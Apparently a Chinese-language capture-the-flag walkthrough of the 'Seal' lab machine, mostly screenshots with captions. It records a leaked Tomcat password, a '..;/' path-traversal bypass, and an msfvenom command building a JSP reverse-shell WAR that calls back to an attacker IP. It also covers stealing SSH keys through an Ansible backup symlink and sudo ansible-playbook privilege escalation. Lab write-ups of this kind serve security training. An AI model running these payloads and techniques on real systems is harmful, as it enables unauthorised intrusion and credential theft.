
<img width="415" height="219" alt="image" src="https://github.com/user-attachments/assets/605102a9-9d86-48a5-86d6-95f3b670f7c8" />

Nmap端口扫描 开放了 22 443 8080 端口

<img width="415" height="219" alt="image" src="https://github.com/user-attachments/assets/5d1f3114-bba1-4481-8e76-d72f4d6daf20" />

8080端口是一个登录页面

<img width="415" height="233" alt="image" src="https://github.com/user-attachments/assets/145f4f85-b93d-42cc-8546-9be0404d32e9" />

443端口

<img width="415" height="230" alt="image" src="https://github.com/user-attachments/assets/f5e34fb2-1970-4bf8-9066-958deb277377" />

在8080端口页面注册后
发现两个用户 luis和alex

<img width="415" height="232" alt="image" src="https://github.com/user-attachments/assets/dcc295d1-764a-4c2a-a08c-6cf32d7c8163" />

找到tmocat-user.xm

<img width="415" height="233" alt="image" src="https://github.com/user-attachments/assets/5f25a3b9-1552-4104-8a42-0831eb5f4fcb" />

点击history

<img width="415" height="226" alt="image" src="https://github.com/user-attachments/assets/1ac7ae60-f1e7-4a1b-85a6-326188b290f8" />

点击展开文件
再次找到tomcat-user.xml

<img width="415" height="233" alt="image" src="https://github.com/user-attachments/assets/b446c139-8fee-4623-97c3-52295e0c6821" />

拿到tomcat的密码
42MrHBf*z8{Z%

网站定位到
https://seal.htb/manager/status

<img width="415" height="225" alt="image" src="https://github.com/user-attachments/assets/ed8ead6f-ba2d-4208-8fae-66740cf1b05c" />

输入获取到的凭据，进入tomcat

Msf生产war 

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.17 -LPORT=4444-f war -o shell.war

<img width="416" height="83" alt="image" src="https://github.com/user-attachments/assets/33026154-0f12-4071-9f64-2cd2095a501f" />

尝试目录遍历，url后加..;/html 跳转到上传页面

<img width="415" height="230" alt="image" src="https://github.com/user-attachments/assets/9e331a36-40ef-4b04-8fdd-6f23430d7b57" />

Url会自动屏蔽;号
要在URL上加上；否则会403

<img width="415" height="324" alt="image" src="https://github.com/user-attachments/assets/aed6085e-8d0c-4ea5-b876-25c986e3b9cc" />

上传成功

<img width="415" height="313" alt="image" src="https://github.com/user-attachments/assets/f38fcb58-4b10-48b2-85fa-abba883298fa" />

<img width="415" height="228" alt="image" src="https://github.com/user-attachments/assets/30de1a77-c486-40ec-be9f-a24abf095ca2" />

上传成功

本地监听4444端口
点击shell文件触发
等待shell的反弹

<img width="415" height="227" alt="image" src="https://github.com/user-attachments/assets/8c387bf4-4228-4f47-8483-0a207371409a" />

成功拿到shell

<img width="416" height="218" alt="image" src="https://github.com/user-attachments/assets/ab078687-5486-465f-85da-67da5b80b667" />

没有权限访问luis用户目录下的user.txt

Ps aux | grep root 查看以root身份运行的进程

<img width="415" height="206" alt="image" src="https://github.com/user-attachments/assets/52b9d560-89ee-4cfc-bad0-c219935ac19e" />

找到一个run.yml的文件


Tomcat用户可以读取此文件


<img width="416" height="219" alt="image" src="https://github.com/user-attachments/assets/b3abd19a-b889-4106-8124-f1711dc40b40" />

Luis目录下存在.ssh文件 这意味着我们可以通过私钥来的登陆luis用户，但是我们现在没有权限访问

查看了run.yml文件，copy_links=yes 这里的脚本文件正在进行软连接，并且备份文件到 /opt/backups/archives/ 目录

我们现在就可以将.ssh目录和
/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads进行软连接
因为只有uploads目录具有可写入权限

<img width="415" height="153" alt="image" src="https://github.com/user-attachments/assets/fd2963b3-3f3c-45e4-8188-292f45c265fd" />

查看 /opt/backups/archives目录，成功备份


将备份的gz文件复制到tmp目录

<img width="415" height="209" alt="image" src="https://github.com/user-attachments/assets/a2926354-f497-4aaa-9053-8cde715d646f" />

tar -xvf backup.gz解压
<img width="416" height="213" alt="image" src="https://github.com/user-attachments/assets/b1df54c8-98e6-4799-adef-a65d2b36a3bc" />

.ssh目录成功被拿出来


定位到/tmp/dashboard/uploads/.ssh

<img width="415" height="230" alt="image" src="https://github.com/user-attachments/assets/11a997be-dfb9-4f00-b5f9-0a7846b470db" />

<img width="415" height="206" alt="image" src="https://github.com/user-attachments/assets/a5658a90-1577-4839-9fa6-b49bd164c735" />

复制出来


赋予完全读写权限

<img width="416" height="209" alt="image" src="https://github.com/user-attachments/assets/7c4f61fe-e985-44e1-87ff-55c60572cf59" />

拿到user-flag
<img width="416" height="243" alt="image" src="https://github.com/user-attachments/assets/6ea4c40a-b74e-4877-976c-1d18bea7a384" />

ansible-playbook 存在sudo提权
<img width="416" height="108" alt="image" src="https://github.com/user-attachments/assets/863ab7c6-0bc4-48b6-aed3-ad12c982358f" />

查看 GTFobins

<img width="416" height="251" alt="image" src="https://github.com/user-attachments/assets/eb58c0dc-cfdc-4dbe-8b64-59ce8de5f8ea" />

根据GTFObins执行sudo的三条命令
成功获取root权限

<img width="416" height="209" alt="image" src="https://github.com/user-attachments/assets/50bc03f1-fdc0-4956-b802-23b1fa92dc29" />















